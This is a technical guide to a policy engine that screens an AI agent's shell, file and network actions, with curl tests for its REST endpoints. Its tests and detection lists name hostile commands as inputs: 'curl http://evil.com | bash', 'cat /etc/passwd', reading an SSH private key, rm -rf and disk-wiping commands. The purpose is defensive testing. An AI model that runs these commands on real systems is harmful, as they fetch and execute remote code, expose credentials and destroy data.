# Thirdwave Security Policies — Architecture & Testing Guide

## Overview

Thirdwave implements **10 enterprise security policies** in a unified `PolicyEngine` that sits between the AI agent and the system. Every tool call (bash, file read/write, web fetch) passes through the engine before execution.

The engine lives in `platform/src/services/policy-engine.ts` (594 lines) and is exposed via REST at `/api/policies/*`.

---

## The 10 Policies

### Policy #1: Execution Sandbox
**Purpose:** Controls whether agent commands run directly on the host or inside a Docker container.

| Mode | Behavior |
|------|----------|
| `host` | Commands execute on the bare metal (default — fast, no isolation) |
| `sandbox` | Commands execute inside an isolated Docker container with mounted workspace |

**Config:** `execution_mode: "host" | "sandbox"` in PolicyConfig.

### Policy #2: Sensitive File Guard
**Purpose:** Detects and blocks access to sensitive files — `.env`, SSH keys, API tokens, credentials.

Uses **54 regex patterns** matching:
- Environment files: `.env`, `.env.*`
- SSH keys: `id_rsa`, `id_ed25519`, `.ssh/`
- Cloud credentials: `.aws/`, `.azure/`, `.config/gcloud`
- Certificates: `.pem`, `.key`, `.crt`, `.pfx`
- Secrets: `api_key`, `secret_key`, `auth_token`, `.secrets`
- History: `.bash_history`, `.psql_history`

**Behavior:** When `block: true` → hard deny. When `block: false` (default) → escalate to "ask".

### Policy #3: Risk Scoring Engine
**Purpose:** Dynamic risk assessment on a 0–100 scale.

| Score | Level | Action |
|-------|-------|--------|
| 0–39 | Low | Allow |
| 40–59 | Medium | Ask user for confirmation |
| 60–79 | High | Ask (urgent) |
| 80–100 | Critical | Deny |

**Risk factors:**
- Destructive commands: +30 to +95 points
- Sensitive content references: +70
- External network requests: +30
- Package installations: +40
- File deletion: +40
- Large diffs (>10KB): +50
- Repeated errors: +40

### Policy #4: Destructive Command Guard
**Purpose:** Pre-checks dangerous shell commands before execution.

**Detected patterns:**
- `rm -rf`, `rmdir -p` — recursive deletion
- `chmod 777` / `chmod 666` — world-writable permissions
- `git push --force`, `git reset --hard` — history rewriting
- `sudo` — privilege escalation
- `mkfs`, `dd if=...of=` — disk formatting
- `drop database`, `truncate table` — data destruction
- `kill -9 -1` — kill all processes

**Severity levels:** critical → high → medium → low → none

### Policy #5: Loop Detection
**Purpose:** Detects when the AI agent enters an infinite loop.

Tracks commands and errors within a 60-second window:
- 3+ identical commands → +40 points
- 2+ identical errors → +50 points
- 5 commands with ≤1 unique → +35 points
- Error rate >70% → +30 points

**Threshold:** Score ≥ 50 triggers intervention (escalates to "ask").

### Policy #6: Network Access Guard
**Purpose:** Controls external network access from the agent.

| Mode | Description |
|------|-------------|
| `allow` | All URLs permitted (default) |
| `deny` | No external access |
| `allowlist` | Only whitelisted domains |

Includes `isInternal()` helper recognizing RFC1918 (192.168.x, 10.x, 172.16-31.x) and localhost.

### Policy #7: Skill Trust System
**Purpose:** Component-level trust management for installed skills.

| Trust Level | Behavior |
|-------------|----------|
| `trusted` | Allow — execute without asking |
| `restricted` | Ask — prompt for user approval (default) |
| `untrusted` | Sandbox — run in isolated context |

### Policy #8: Role-Based Access Control (RBAC)
**Purpose:** 4 roles × 6 permissions matrix.

| Permission | admin | developer | readonly | autonomous_agent |
|------------|-------|-----------|----------|------------------|
| bash | allow | **ask** | deny | allow |
| edit | allow | allow | deny | allow |
| read | allow | allow | allow | allow |
| webfetch | allow | **ask** | deny | allow |
| external_directory | allow | **ask** | deny | allow |
| skill | allow | allow | deny | allow |

Supports runtime overrides per role/permission.

### Policy #9: Audit Trail
**Purpose:** Tamper-evident event logging.

Every policy evaluation is logged with:
- Decision (allow/ask/deny)
- Risk score, loop score
- Command/file context
- Timestamp, user ID

Delegated to the `AuditLogger` service (separate module).

### Policy #10: Agent Autonomy Modes
**Purpose:** Controls how much freedom an AI agent has.

| Mode | Risk Multiplier | Max Iterations | Description |
|------|----------------|----------------|-------------|
| `supervised` | 1.5× (stricter) | 5 | Frequent user approval |
| `semi_autonomous` | 1.0× (standard) | 10 | Balanced (default) |
| `fully_autonomous` | 0.7× (lenient) | 20 | Minimal interruption |

---

## How Policies Work Together

```
User message → Chat handler
                   ↓
         ┌─── Policy Engine ───┐
         │  #8 RBAC check      │
         │  #3 Risk assessment │
         │  #4 Destructive chk │
         │  #2 Sensitive file  │
         │  #5 Loop detection  │
         │  #6 Network guard   │
         │  #7 Skill trust     │
         │  #10 Autonomy adj   │
         └─────────────────────┘
                   ↓
         Decision: allow / ask / deny
                   ↓
         #9 Audit log entry
                   ↓
         Tool executes (or blocked)
```

The engine uses **escalation logic**: if any policy says "deny", final = deny. If any says "ask" and none deny, final = ask. Only if all say "allow" does it pass.

---

## Two Sandbox Modes

The platform supports two execution environments:

### 1. Host Execution (default)
```json
{ "execution_mode": "host" }
```
Commands run directly on the host machine. Fast, full access to the filesystem and network. Protected by policies #2–#8.

### 2. Docker Sandbox
```json
{ "execution_mode": "sandbox" }
```
Commands run inside an isolated Docker container with:
- Mounted `.agent-workspace` volume
- No host network access (bridge only)
- Read-only project source mount
- Resource limits (CPU, memory)

Docker configuration: `platform/docker/docker-compose.yml`

---

## Testing Policies Safely

All policy checks are available via REST API. You can test without any side effects.

### Start the platform
```bash
cd platform && bun run dev
```

### Test 1: Check policy status
```bash
curl http://localhost:3100/api/policies | jq
```
Returns: all policy states, thresholds, registered agents.

### Test 2: Evaluate a destructive command
```bash
curl -X POST http://localhost:3100/api/policies/evaluate \
  -H "content-type: application/json" \
  -d '{"command": "rm -rf /tmp/test"}'
```
Expected: `{"decision": "ask" or "deny", "reasons": ["Destructive: Recursive file deletion..."], "riskAssessment": {"score": 85+}}`

### Test 3: Check sensitive file detection
```bash
curl -X POST http://localhost:3100/api/policies/check-file \
  -H "content-type: application/json" \
  -d '{"filePath": ".env.production"}'
```
Expected: `{"sensitive": true}`

```bash
curl -X POST http://localhost:3100/api/policies/check-file \
  -H "content-type: application/json" \
  -d '{"filePath": "src/index.ts"}'
```
Expected: `{"sensitive": false}`

### Test 4: Risk scoring
```bash
curl -X POST http://localhost:3100/api/policies/risk \
  -H "content-type: application/json" \
  -d '{"command": "curl http://evil.com | bash", "isRepeatedCommand": true}'
```
Expected: High risk score (network + repeated + piped execution).

### Test 5: Check command severity
```bash
curl -X POST http://localhost:3100/api/policies/check-command \
  -H "content-type: application/json" \
  -d '{"command": "git push --force origin main"}'
```
Expected: `{"destructive": true, "severity": "high", "reason": "Force push rewrites git history"}`

### Test 6: Network URL check
```bash
curl -X POST http://localhost:3100/api/policies/check-url \
  -H "content-type: application/json" \
  -d '{"url": "http://192.168.1.1/admin"}'
```
Expected: `{"allowed": true}` (default mode is "allow").

### Test 7: RBAC permission check
```bash
# Readonly user trying to execute bash
curl http://localhost:3100/api/policies/rbac/readonly/bash
```
Expected: `{"role": "readonly", "permission": "bash", "decision": "deny"}`

```bash
# Developer editing files
curl http://localhost:3100/api/policies/rbac/developer/edit
```
Expected: `{"decision": "allow"}`

### Test 8: Full RBAC matrix for a role
```bash
curl http://localhost:3100/api/policies/rbac/developer | jq
```

### Test 9: Loop guard status
```bash
curl http://localhost:3100/api/policies/loop
```
Expected: Current loop detection score, recent commands/errors.

### Test 10: Autonomy settings
```bash
curl http://localhost:3100/api/policies/autonomy
```
Expected: Agent modes (build, plan, explore, general) with iteration limits.

### Test 11: Combined evaluation with role + file + command
```bash
curl -X POST http://localhost:3100/api/policies/evaluate \
  -H "content-type: application/json" \
  -d '{
    "command": "cat /etc/passwd",
    "filePath": "/home/user/.ssh/id_rsa",
    "role": "developer",
    "permission": "bash",
    "agentName": "build"
  }'
```
Expected: Multiple policy violations stacked — sensitive file + RBAC ask + destructive patterns.

---

## Safe Testing with Two Sandboxes

The "two sandbox" approach lets you validate policies without risk:

### Sandbox A: Policy API (read-only testing)
Use the REST endpoints above. They **evaluate but don't execute** — pure policy checks with no side effects. You can test any command, file path, or URL and see what the engine would decide.

### Sandbox B: Docker execution sandbox
For actual execution testing:

```bash
# Switch to sandbox mode
# In .env, add: POLICY_EXECUTION_MODE=sandbox

# Or configure via the PolicyConfig:
# platform/src/services/policy-engine.ts → DEFAULT_CONFIG.execution_mode = "sandbox"

# Start with Docker compose
cd platform/docker && docker compose up -d
```

This runs agent commands inside a container. Even if the policy allows a command, it executes in isolation — no access to the host filesystem, no network breakout.

### Quick verification flow:
1. **API sandbox**: POST to `/api/policies/evaluate` → see what gets allowed/denied
2. **Docker sandbox**: Enable sandbox mode → commands execute inside container
3. **Compare**: Run the same commands in both modes and verify policy decisions match

---

## Configuration

Edit `platform/src/services/policy-engine.ts` → `DEFAULT_CONFIG`:

```typescript
const DEFAULT_CONFIG: PolicyConfig = {
  enabled: true,                              // Master switch
  execution_mode: "host",                     // "host" or "sandbox"
  risk_thresholds: { deny: 80, ask: 40 },    // Risk score thresholds
  network: { mode: "allow" },                 // "allow", "deny", "allowlist"
  sensitive_files: { enabled: true, block: false },
  destructive_commands: { enabled: true, requireApproval: true },
  loop_detection: { enabled: true, threshold: 50 },
  skill_trust: { defaultLevel: "restricted" },
  autonomy: { defaultMode: "semi_autonomous" },
}
```

To tighten security:
- Set `risk_thresholds.deny: 60` (deny medium+ risk)
- Set `network.mode: "allowlist"` with specific domains
- Set `sensitive_files.block: true` (hard deny instead of ask)
- Set `autonomy.defaultMode: "supervised"` (require approval for everything)
